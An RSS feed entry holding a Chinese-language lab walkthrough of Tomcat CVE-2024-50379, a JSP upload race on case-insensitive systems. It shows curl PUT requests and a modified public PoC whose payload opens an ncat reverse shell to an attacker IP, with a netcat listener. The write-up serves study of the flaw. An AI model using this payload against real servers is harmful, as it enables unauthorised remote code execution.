<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>夜路归</title>
        <link>https://Yerucrem.github.io/</link>
        <description>Recent content on 夜路归</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>zh-cn</language>
        <copyright>Yerucrem</copyright>
        <lastBuildDate>Thu, 17 Apr 2025 00:00:00 +0000</lastBuildDate><atom:link href="https://Yerucrem.github.io/index.xml" rel="self" type="application/rss+xml" /><item>
        <title>CVE-2024-50379</title>
        <link>https://Yerucrem.github.io/p/cve-2024-50379/</link>
        <pubDate>Thu, 17 Apr 2025 00:00:00 +0000</pubDate>
        
        <guid>https://Yerucrem.github.io/p/cve-2024-50379/</guid>
        <description>&lt;h1 id=&#34;tomcat-cve-2024-50379&#34;&gt;Tomcat: CVE-2024-50379
&lt;/h1&gt;&lt;h2 id=&#34;漏洞概述&#34;&gt;漏洞概述
&lt;/h2&gt;&lt;p&gt;Apache Tomcat 是一个开源 Web 服务器和 Servlet 容器 。 &lt;strong&gt;Servlet&lt;/strong&gt; 是一个 Java 类，它被创建在应用服务器上运行并处理客户端请求。它接收客户端的 HTTP 请求，进行处理，并生成正确的响应。Servlet &lt;strong&gt;容器&lt;/strong&gt;为 Java Servlet 提供运行时环境并管理它们的生命周期。&lt;/p&gt;
&lt;p&gt;该漏洞影响以下版本的 Apache Tomcat：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Apache Tomcat 11.0.0-M1 至 11.0.1（在 11.0.2 或更高版本中修复）&lt;/li&gt;
&lt;li&gt;Apache Tomcat 10.1.0-M1 to 10.1.33 (Fixed in 10.1.34 or later)&lt;/li&gt;
&lt;li&gt;Apache Tomcat 9.0.0.M1 to 9.0.97 (Fixed in 9.0.98 or later)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;CVE -2024-50379 是一个检查时使用时 Time-of-check Time-of-use(TOCTOU) 漏洞的例子。TOCTOU  漏洞源于检查资源和使用资源之间的竞争条件。换句话说，系统在检查资源状态之后、使用资源之前，资源发生了变化，系统最终停止使用已更改的资源。在此漏洞中，TOCTOU 竞争条件发生在不区分大小写的系统上的 JSP（Java 服务器页面）编译期间，前提是默认 servlet 具有写入权限。&lt;/p&gt;
&lt;h2 id=&#34;技术背景分析&#34;&gt;技术背景分析
&lt;/h2&gt;&lt;p&gt;在易受攻击的服务器上利用该漏洞主要有两个条件：&lt;/p&gt;
&lt;p&gt;首先，服务器允许用户&lt;strong&gt;上传和删除文件&lt;/strong&gt;，也就是说，服务器配置为接受 HTTP 命令，例如 PUT 和 DELETE。通过在 &lt;code&gt;web.xml&lt;/code&gt; 配置文件中将 &lt;code&gt;readonly&lt;/code&gt; 设置为 &lt;code&gt;false&lt;/code&gt; 来启用写入功能。注意，默认配置为 readonly。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-xml&#34; data-lang=&#34;xml&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nt&#34;&gt;&amp;lt;init-param&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nt&#34;&gt;&amp;lt;param-name&amp;gt;&lt;/span&gt;readonly&lt;span class=&#34;nt&#34;&gt;&amp;lt;/param-name&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nt&#34;&gt;&amp;lt;param-value&amp;gt;&lt;/span&gt;false&lt;span class=&#34;nt&#34;&gt;&amp;lt;/param-value&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nt&#34;&gt;&amp;lt;/init-param&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;下面是一个不安全配置的示例，其中应用程序服务器设置为默认允许写入。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-xml&#34; data-lang=&#34;xml&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nt&#34;&gt;&amp;lt;servlet&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nt&#34;&gt;&amp;lt;servlet-name&amp;gt;&lt;/span&gt;default&lt;span class=&#34;nt&#34;&gt;&amp;lt;/servlet-name&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nt&#34;&gt;&amp;lt;servlet-class&amp;gt;&lt;/span&gt;org.apache.catalina.servlets.DefaultServlet&lt;span class=&#34;nt&#34;&gt;&amp;lt;/servlet-class&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nt&#34;&gt;&amp;lt;init-param&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nt&#34;&gt;&amp;lt;param-name&amp;gt;&lt;/span&gt;debug&lt;span class=&#34;nt&#34;&gt;&amp;lt;/param-name&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nt&#34;&gt;&amp;lt;param-value&amp;gt;&lt;/span&gt;0&lt;span class=&#34;nt&#34;&gt;&amp;lt;/param-value&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nt&#34;&gt;&amp;lt;/init-param&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nt&#34;&gt;&amp;lt;init-param&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nt&#34;&gt;&amp;lt;param-name&amp;gt;&lt;/span&gt;listings&lt;span class=&#34;nt&#34;&gt;&amp;lt;/param-name&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nt&#34;&gt;&amp;lt;param-value&amp;gt;&lt;/span&gt;false&lt;span class=&#34;nt&#34;&gt;&amp;lt;/param-value&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nt&#34;&gt;&amp;lt;/init-param&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nt&#34;&gt;&amp;lt;init-param&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nt&#34;&gt;&amp;lt;param-name&amp;gt;&lt;/span&gt;readonly&lt;span class=&#34;nt&#34;&gt;&amp;lt;/param-name&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nt&#34;&gt;&amp;lt;param-value&amp;gt;&lt;/span&gt;false&lt;span class=&#34;nt&#34;&gt;&amp;lt;/param-value&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nt&#34;&gt;&amp;lt;/init-param&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nt&#34;&gt;&amp;lt;load-on-startup&amp;gt;&lt;/span&gt;1&lt;span class=&#34;nt&#34;&gt;&amp;lt;/load-on-startup&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nt&#34;&gt;&amp;lt;/servlet&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;利用此漏洞的第二个条件是 Tomcat 运行在不区分大小写的系统上，例如 MS Windows 或 macOS。当满足这两个条件时，利用此漏洞就变成了与操作系统赛跑。&lt;/p&gt;
&lt;p&gt;在 Linux 等区分大小写的系统上， &lt;code&gt;demo.jsp&lt;/code&gt; 和 &lt;code&gt;demo.Jsp&lt;/code&gt; 是两个不同的文件。因此，在 Linux 系统上， &lt;code&gt;documents&lt;/code&gt; 和 &lt;code&gt;Documents&lt;/code&gt; 共存于同一目录中并非不可能。&lt;/p&gt;
&lt;p&gt;由于微软 Windows 系统不区分大小写，因此 &lt;code&gt;demo.jsp&lt;/code&gt; 和 &lt;code&gt;demo.Jsp&lt;/code&gt; 不可能是两个不同的文件；然而，对于 Tomcat 来说，前者是一个可以执行的 Servlet，而后者则被视为文本文件。换句话说，微软 Windows 对待 &lt;code&gt;demo.Jsp&lt;/code&gt; 和正确命名为 &lt;code&gt;demo.jsp&lt;/code&gt; Servlet 没有任何区别；Tomcat 的大小写检查会阻止 &lt;code&gt;demo.Jsp&lt;/code&gt; 被执行，从而避免将其视为可执行文件。&lt;/p&gt;
&lt;p&gt;例如，如果我们尝试创建文件 &lt;code&gt;demo.jsp&lt;/code&gt; ，使用 &lt;code&gt;curl -X PUT -d &amp;quot;test&amp;quot; http://10.10.211.24:8080/demo.jsp&lt;/code&gt; 将会产生错误。由于 Servlet 可以在服务器端执行命令，因此出现此错误是意料之中的；因此，允许用户上传 &lt;code&gt;.jsp&lt;/code&gt; 文件会赋予他们远程代码执行 ( RCE ) 的能力。在下面的终端中，我们看到一个示例错误。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;root@yrc:~# curl -X PUT -d &lt;span class=&#34;s2&#34;&gt;&amp;#34;test&amp;#34;&lt;/span&gt; http://10.10.211.24:8080/demo.jsp
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;!doctype html&amp;gt;&amp;lt;html &lt;span class=&#34;nv&#34;&gt;lang&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;en&amp;#34;&lt;/span&gt;&amp;gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;HTTP Status &lt;span class=&#34;m&#34;&gt;404&lt;/span&gt; – Not Found&amp;lt;/title&amp;gt;&amp;lt;style &lt;span class=&#34;nv&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;text/css&amp;#34;&lt;/span&gt;&amp;gt;body &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;font-family:Tahoma,Arial,sans-serif&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; h1, h2, h3, b &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;color:white&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;background-color:#525D76&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; h1 &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;font-size:22px&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; h2 &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;font-size:16px&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; h3 &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;font-size:14px&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; p &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;font-size:12px&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; a &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;color:black&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; .line &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;height:1px&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;background-color:#525D76&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;border:none&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;&amp;lt;/style&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&amp;lt;h1&amp;gt;HTTP Status &lt;span class=&#34;m&#34;&gt;404&lt;/span&gt; – Not Found&amp;lt;/h1&amp;gt;&amp;lt;hr &lt;span class=&#34;nv&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;line&amp;#34;&lt;/span&gt; /&amp;gt;&amp;lt;p&amp;gt;&amp;lt;b&amp;gt;Type&amp;lt;/b&amp;gt; Status Report&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;&amp;lt;b&amp;gt;Message&amp;lt;/b&amp;gt; JSP file &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;#47;demo.jsp] not found&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;&amp;lt;b&amp;gt;Description&amp;lt;/b&amp;gt; The origin server did not find a current representation for the target resource or is not willing to disclose that one exists.&amp;lt;/p&amp;gt;&amp;lt;hr class=&amp;#34;line&amp;#34; /&amp;gt;&amp;lt;h3&amp;gt;Apache Tomcat/10.1.30&amp;lt;/h3&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt; &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;让我们创建一个扩展名为 &lt;code&gt;Jsp&lt;/code&gt; 或 &lt;code&gt;JSP&lt;/code&gt; 的文件。此步骤应该可以成功，因为 Tomcat 不会将此类扩展名视为可执行文件。我们可以看到 &lt;code&gt;demo.Jsp&lt;/code&gt; 文件已在服务器上成功创建。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;root@yrc:~# curl -X PUT -d &lt;span class=&#34;s2&#34;&gt;&amp;#34;test&amp;#34;&lt;/span&gt; http://10.10.211.24:8080/demo.Jsp
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;root@yrc:~# curl http://10.10.211.24:8080/demo.Jsp
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;test&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;如果我们尝试访问 &lt;code&gt;demo.Jsp&lt;/code&gt; ，在不区分大小写的系统中，它与 &lt;code&gt;demo.jsp&lt;/code&gt; 没有什么不同，但 Tomcat 会区分大小写，检查扩展名并将其视为文本文件。结果表明，当服务器负载过重时，可能会出现竞争条件。 &lt;code&gt;demo.Jsp&lt;/code&gt; 可能会被编译并作为 servlet 执行。由于系统不区分大小写，因此对 servlet 扩展名（如 &lt;code&gt;Jsp&lt;/code&gt; 和 &lt;code&gt;JSP&lt;/code&gt; ）的约束已经从操作系统转移到应用服务器。换句话说，当系统负载过重，并且同时读写同一个文件时，大小写检查可能会被绕过，导致上传的文件被作为 servlet 执行。&lt;/p&gt;
&lt;p&gt;本次使用的tomcat版本为：10.1.25&lt;/p&gt;
&lt;p&gt;&lt;em&gt;不知道为什么，使用nmap -sV扫描扫不出版本。使用curl查看页面可以看到tomcat版本&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250417144624821.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250417144624821&#34;
	
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;漏洞利用&#34;&gt;漏洞利用
&lt;/h2&gt;&lt;p&gt;了解了几个PoC，其中一个如下：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;git clone https://github.com/iSee857/CVE-2024-50379-PoC
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;我们将对该脚本进行两处更改：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;修改循环计数器&lt;/strong&gt; ：在指定实验环境中，我们注意到将四个请求中的每一个重复 2000 次而不是 10000 次效率更高。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;更改有效载荷&lt;/strong&gt; ：为了进行更有趣的利用，我们将使用反向 shell，而不是在目标系统上启动计算器。&lt;/p&gt;
&lt;h3 id=&#34;修改循环计数器&#34;&gt;修改循环计数器
&lt;/h3&gt;&lt;p&gt;原始 PoC 代码在第 43 行重复了 10000 次 &lt;code&gt;for&lt;/code&gt; 循环。为了获得更高效的结果，将次数降低到 2000。更新后的行如下所示：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#...&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;futures&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 循环执行10000次&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# for _ in range(10000):&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;_&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2000&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# ...&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;更改有效载荷&#34;&gt;更改有效载荷
&lt;/h3&gt;&lt;p&gt;此 PoC 漏洞利用使用了一个打开 &lt;code&gt;calc.exe&lt;/code&gt; Payload，可以从第 37 行推断出来。为了简化此漏洞利用，我们在 MS Windows 服务器上安装了 &lt;code&gt;ncat&lt;/code&gt; 。因此，我们将用另一个连接到攻击者系统的 Payload 替换该 Payload。注释掉的 Payload 和新的 Payload 如下所示。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# payload_put = &amp;#34;aa&amp;lt;% Runtime.getRuntime().exec(\&amp;#34;calc.exe\&amp;#34;);%&amp;gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;payload_put&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;lt;%@ page import=&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\&amp;#34;&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;java.io.*&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\&amp;#34;&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; %&amp;gt;&amp;lt;% Runtime.getRuntime().exec(&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\&amp;#34;&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;cmd /c start ncat -e cmd.exe 10.10.241.219 8888&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\&amp;#34;&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;); %&amp;gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;此有效载荷使用 JSP 的 &lt;code&gt;Runtime.getRuntime().exec()&lt;/code&gt; 来执行 &lt;code&gt;cmd /c start ncat -e cmd.exe 10.10.241.219 8888&lt;/code&gt; 。如上所述，这是可能的，因为我们为了演示目的安装了 &lt;code&gt;ncat&lt;/code&gt; 。&lt;/p&gt;
&lt;h3 id=&#34;开始&#34;&gt;开始
&lt;/h3&gt;&lt;p&gt;在运行此 PoC 之前，我们需要监听传入的连接。让我们使用 &lt;code&gt;netcat -lvnp 8888&lt;/code&gt; 在 攻击机上启动 &lt;code&gt;netcat&lt;/code&gt; 。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250417145126222.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250417145126222&#34;
	
	
&gt;&lt;/p&gt;
